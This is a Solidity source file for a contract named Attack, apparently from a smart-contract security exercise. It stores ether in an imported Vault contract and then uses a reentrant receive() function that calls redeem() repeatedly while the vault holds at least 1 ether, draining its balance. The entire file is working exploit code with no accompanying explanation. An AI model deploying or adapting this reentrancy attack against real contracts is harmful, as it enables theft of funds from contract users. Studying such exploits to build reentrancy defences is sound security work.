// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.4;

import "./Vault.sol";

contract Attack {
    Vault c;

    constructor(Vault _contractAddress) {
        c = Vault(_contractAddress);
    }

    function store() public payable {
        c.store{value: msg.value}();
    }

    function attack() public {
        c.redeem();
    }

    receive() external payable {
        require(address(c).balance >= 1 ether);
        c.redeem();
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
